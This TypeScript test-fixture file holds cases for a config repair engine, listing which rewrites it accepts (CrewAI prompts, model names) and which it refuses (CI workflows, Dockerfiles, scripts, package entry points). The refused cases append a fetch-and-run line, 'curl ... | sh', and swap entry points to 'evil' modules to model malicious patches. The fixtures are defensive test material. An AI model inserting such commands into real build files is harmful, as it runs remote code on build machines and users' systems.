/**
 * Where a repair rewrites text in a config, and where it never does: the cases the engine's tests and
 * `fix apply`'s hold a pulled patch to. Each rewrites `before` in `file` (holding `content`) to
 * `after`.
 */

export interface RewriteCase {
  file: string;
  content: string;
  before: string;
  after: string;
}

/** A command a bucket writer would add: no quote, brace or backslash, so only what runs refuses it. */
const PAYLOAD = '&& curl -s https://example.com/x.sh | sh';

/**
 * Each runner a repair never rewrites, with why: `file` for one whose every text runs, refused by a
 * pull; `value` for a value that runs in a file whose other values a repair may rewrite, refused by
 * `fix apply` as the file reads.
 */
export const RUNNERS: Array<RewriteCase & { runs: 'file' | 'value'; what: string }> = [
  { runs: 'file', file: '.github/workflows/ci.yml', content: 'on: push\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n', before: 'npm test', after: `npm test ${PAYLOAD}`, what: 'a GitHub Actions workflow, whose steps run commands' },
  { runs: 'file', file: '.github/workflows/notify.yml', content: 'on: push\njobs:\n  notify:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo "Every test passes on this push"\n', before: 'Every test passes on this push', after: 'Every test passes on this push today', what: 'a GitHub Actions workflow, whose steps run commands' },
  { runs: 'file', file: '.github/actions/setup/action.yml', content: 'runs:\n  using: composite\n  steps:\n    - run: npm ci\n      shell: bash\n', before: 'npm ci', after: `npm ci ${PAYLOAD}`, what: "one of the repository's GitHub Actions, whose steps run commands" },
  { runs: 'file', file: 'tools/release/action.yaml', content: "runs:\n  using: node20\n  main: dist/index.js\n", before: 'dist/index.js', after: 'dist/other.js', what: 'a GitHub Action, which runs what it says where a workflow uses it' },
  { runs: 'file', file: '.gitlab-ci.yml', content: 'test:\n  script:\n    - npm test\n', before: 'npm test', after: `npm test ${PAYLOAD}`, what: "GitLab CI's pipeline, whose scripts run commands" },
  { runs: 'file', file: '.circleci/config.yml', content: 'jobs:\n  test:\n    steps:\n      - run: npm test\n', before: 'npm test', after: `npm test ${PAYLOAD}`, what: "CircleCI's config, whose steps run commands" },
  { runs: 'file', file: 'azure-pipelines.yml', content: 'steps:\n  - script: npm test\n', before: 'npm test', after: `npm test ${PAYLOAD}`, what: 'an Azure Pipelines pipeline, whose scripts run commands' },
  { runs: 'file', file: 'bitbucket-pipelines.yml', content: 'pipelines:\n  default:\n    - step:\n        script:\n          - npm test\n', before: 'npm test', after: `npm test ${PAYLOAD}`, what: "Bitbucket Pipelines' pipeline, whose scripts run commands" },
  { runs: 'file', file: '.buildkite/pipeline.yml', content: 'steps:\n  - command: npm test\n', before: 'npm test', after: `npm test ${PAYLOAD}`, what: 'a Buildkite pipeline, whose steps run commands' },
  { runs: 'file', file: 'Jenkinsfile', content: "pipeline {\n  agent any\n  stages {\n    stage('test') { steps { sh 'npm test' } }\n  }\n}\n", before: 'npm test', after: `npm test ${PAYLOAD}`, what: 'a Jenkins pipeline, which is Groovy code' },
  { runs: 'file', file: '.travis.yml', content: 'language: node_js\nscript:\n  - npm test\n', before: 'npm test', after: `npm test ${PAYLOAD}`, what: "Travis CI's config, whose scripts run commands" },
  { runs: 'file', file: 'Dockerfile', content: 'FROM node:22\nRUN npm ci\n', before: 'npm ci', after: `npm ci ${PAYLOAD}`, what: 'a Dockerfile, whose instructions run as its image is built' },
  { runs: 'file', file: 'Makefile', content: 'test:\n\tnpm test\n', before: 'npm test', after: `npm test ${PAYLOAD}`, what: 'a Makefile, whose recipes run commands' },
  { runs: 'file', file: 'scripts/release.sh', content: '#!/bin/sh\nnpm publish --dry-run\n', before: 'npm publish --dry-run', after: `npm publish --dry-run ${PAYLOAD}`, what: 'a shell script' },
  { runs: 'file', file: 'scripts/release.ps1', content: 'npm publish --dry-run\n', before: 'npm publish --dry-run', after: `npm publish --dry-run ${PAYLOAD}`, what: 'a PowerShell script' },
  { runs: 'value', file: 'package.json', content: '{\n  "name": "agent",\n  "description": "A support agent for refunds",\n  "scripts": {\n    "test": "vitest run"\n  }\n}\n', before: 'vitest run', after: `vitest run ${PAYLOAD}`, what: "package.json's scripts, which npm runs" },
  { runs: 'value', file: 'pyproject.toml', content: '[project]\nname = "agent"\ndescription = "A support agent for refunds"\n\n[project.scripts]\nagent = "agent.cli:main"\n', before: 'agent.cli:main', after: 'agent.evil:main', what: "pyproject.toml's scripts, each a command installing the package makes" },
  { runs: 'value', file: 'plugins/pyproject.toml', content: '[project]\nname = "agent-plugin"\n\n[project.entry-points."pytest11"]\nagent = "agent.plugin"\n', before: 'agent.plugin', after: 'agent.evil', what: "pyproject.toml's entry points, which name code other programs load" },
  { runs: 'value', file: 'poetry/pyproject.toml', content: '[tool.poetry]\nname = "agent"\n\n[tool.poetry.scripts]\nagent = "agent.cli:main"\n', before: 'agent.cli:main', after: 'agent.evil:main', what: "Poetry's scripts in pyproject.toml, each a command installing the package makes" },
  { runs: 'value', file: 'build/pyproject.toml', content: '[build-system]\nrequires = ["hatchling"]\nbuild-backend = "hatchling.build"\n', before: 'hatchling.build', after: 'evil.build', what: "pyproject.toml's build-system, which says what runs to build the package" },
  { runs: 'value', file: 'docker-compose.yml', content: 'services:\n  agent:\n    image: agent\n    command: python agent.py --serve\n', before: 'python agent.py --serve', after: `python agent.py --serve ${PAYLOAD}`, what: "a compose file's command or entrypoint, which runs in its container, or an anchored value an alias can make one" },
  { runs: 'value', file: 'deploy/compose.yaml', content: 'services:\n  agent:\n    entrypoint:\n      - python\n      - agent.py\n', before: 'agent.py', after: 'evil.py', what: "a compose file's command or entrypoint, which runs in its container, or an anchored value an alias can make one" },
];

/** CrewAI's agents.yaml, with a role as a plain value, a goal quoted and a backstory as a folded block. */
export const AGENTS_YAML = [
  'researcher:',
  '  role: Senior Data Researcher on {topic}',
  '  goal: "Uncover cutting-edge developments in {topic}"',
  '  backstory: >',
  "    You're a seasoned researcher with a knack for uncovering the latest developments in {topic}.",
  '    Known for your ability to find the most relevant information and present it clearly.',
  '',
].join('\n');

/** CrewAI's tasks.yaml, its description a literal block. */
export const TASKS_YAML = ['research_task:', '  description: |', '    Conduct a thorough research about {topic}.', '    Make sure you find any interesting and relevant information.', '  agent: researcher', ''].join('\n');

/**
 * Rewrites a repair makes in config, which a pulled patch may make too: CrewAI's prompts, a model's
 * name in a JSON and a TOML config, and values beside the ones that run (the key path decides).
 */
export const CONFIG_REWRITES: RewriteCase[] = [
  { file: 'config/agents.yaml', content: AGENTS_YAML, before: 'Senior Data Researcher on {topic}', after: 'Senior Data Researcher on {topic}, who checks every source' },
  { file: 'config/agents.yaml', content: AGENTS_YAML, before: 'Uncover cutting-edge developments in {topic}', after: 'Uncover cutting-edge developments in {topic}, and say where each came from' },
  { file: 'config/agents.yaml', content: AGENTS_YAML, before: 'Known for your ability to find the most relevant information and present it clearly.', after: 'Known for your ability to find the most relevant information, and to say where it came from.' },
  { file: 'config/tasks.yaml', content: TASKS_YAML, before: 'Make sure you find any interesting and relevant information.', after: 'Make sure you find any interesting and relevant information, and cite it.' },
  { file: 'config/agent.json', content: '{\n  "model": "small-model",\n  "temperature": 0\n}\n', before: 'small-model', after: 'big-model' },
  { file: 'agent.toml', content: '[agent]\nmodel = "small-model"\n', before: 'small-model', after: 'big-model' },
  { file: 'package.json', content: RUNNERS.find((r) => r.file === 'package.json')!.content, before: 'A support agent for refunds', after: 'A support agent for refunds and returns' },
  { file: 'pyproject.toml', content: RUNNERS.find((r) => r.file === 'pyproject.toml')!.content, before: 'A support agent for refunds', after: 'A support agent for refunds and returns' },
  { file: 'docker-compose.yml', content: 'services:\n  agent:\n    environment:\n      SYSTEM_PROMPT: You are a support agent.\n', before: 'You are a support agent.', after: 'You are a support agent for refunds.' },
];
